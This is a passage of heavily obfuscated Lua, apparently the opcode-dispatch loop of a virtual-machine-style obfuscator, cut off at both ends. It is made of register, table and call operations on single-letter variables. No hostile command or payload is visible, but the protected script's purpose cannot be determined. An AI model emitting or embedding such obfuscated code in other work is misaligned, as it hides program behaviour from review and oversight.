A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];A=o[2];D,c=J(e[A]());B=A-1;c=c+A-1;a=0;for o=A,c do a=a+1;e[o]=D[a];end;B=c;d=d+1;o=l[d];A=o[2];C={};a=0;c=B;for o=A+1,c do a=a+1;C[a]=e[o];end;e[A](r(C,1,c-A));B=A;d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=n[o[3]];else local l=o[2];local n={};local d=0;local f=B;for o=l+1,f do d=d+1;n[d]=e[o];end;local n={e[l](r(n,1,f-l))};local o=l+o[5]-2;d=0;for o=l,o do d=d+1;e[o]=n[d];end;B=o;end;elseif c<=168 then e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];elseif c==169 then local n=o[2];local l=B;local d={};local o=0;for l=n,l do o=o+1;d[o]=e[l];end;do return r(d,1,o)end;else e[o[2]]=n[o[3]]-e[o[5]];end;elseif c<=172 then if c>171 then local J;local a;local c;local C;local D;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;else local C;local c;local A;local a;local f;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];f=o[2];a={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;a[A]=e[o];end;C={e[f](r(a,1,c-f))};c=f+o[5]-2;A=0;for o=f,c do A=A+1;e[o]=C[A];end;B=c;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];f=o[2];e[f]=e[f]-e[f+2];d=d+o[3];end;elseif c<=173 then local C;local D;local c;local f;local a;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+n[o[5]];d=d+1;o=l[d];A=o[2];a={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;a[f]=e[o];end;D={e[A](r(a,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=D[f];end;B=c;d=d+1;o=l[d];e[o[2]]=n[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];A=o[2];c=A+o[3]-2;C={};f=0;for o=A,c do f=f+1;C[f]=e[o];end;do return r(C,1,f)end;d=d+1;o=l[d];d=d+o[3];elseif c==174 then local J;local D;local c;local A;local a;local f;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];f=o[2];a={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;a[A]=e[o];end;D={e[f](r(a,1,c-f))};c=f+o[5]-2;A=0;for o=f,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];f=o[2];a={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;a[A]=e[o];end;D={e[f](r(a,1,c-f))};c=f+o[5]-2;A=0;for o=f,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];f=o[2];J=e[o[3]];e[f+1]=J;e[f]=J[n[o[5]]];else local d=o[2];local l=e[o[3]];e[d+1]=l;e[d]=l[e[o[5]]];end;elseif c<=180 then if c<=177 then if c==176 then local d=o[2];local l=(o[5]-1)*50;local n=e[d];local o=B-d;for o=1,o do n[l+o]=e[d+o]end;else local B=E[o[3]];local A;local n={};A=I({},{__index=function(d,o)local o=n[o];return o[1][o[2]];end,__newindex=function(e,o,d)local o=n[o]o[1][o[2]]=d;end;});for f=1,o[5]do d=d+1;local o=l[d];if o[1]==209 then n[f-1]={e,o[3]};else n[f-1]={C,o[3]};end;T[#T+1]=n;end;e[o[2]]=K(B,A,f);end;elseif c<=178 then local D;local a;local c;local C;local J;local A;A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];d=d+o[3];elseif c>179 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;else e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];end;elseif c<=182 then if c==181 then local J;local a;local c;local C;local D;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];d=d+o[3];else local S;local a;local c;local J;local D;local A;e[o[2]]=C[o[3]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];J={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;J[c]=e[o];end;S={e[A](r(J,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=S[c];end;B=a;d=d+1;o=l[d];if not e[o[2]]then d=d+1;else d=d+o[3];end;end;elseif c<=183 then for o=o[2],o[3]do e[o]=nil;end;elseif c>184 then if(n[o[2]]<=e[o[5]])then d=d+1;else d=d+o[3];end;else local a;local D;local c;local C;local A;e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]]-e[o[5]];d=d+1;o=l[d];A=o[2];C={};c=A+o[3]-1;for o=A+1,c do C[#C+1]=e[o];end;do return e[A](r(C,1,c-A))end;d=d+1;o=l[d];A=o[2];c=B;D={};a=0;for o=A,c do a=a+1;D[a]=e[o];end;do return r(D,1,a)end;d=d+1;o=l[d];do return end;end;elseif c<=195 then if c<=190 then if c<=187 then if c==186 then local f=o[2];local n={};for o=1,#T do local o=T[o];for d=0,#o do local o=o[d];local l=o[1];local d=o[2];if l==e and d>=f then n[d]=l[d];o[1]=n;end;end;end;else if(e[o[2]]<=e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=188 then local c;local A;local a;local f;e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];f=o[2];a={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;a[A]=e[o];end;e[f](r(a,1,c-f));B=f;d=d+1;o=l[d];do return end;elseif c>189 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else e[o[2]]=n[o[3]]-e[o[5]];end;elseif c<=192 then if c>191 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do 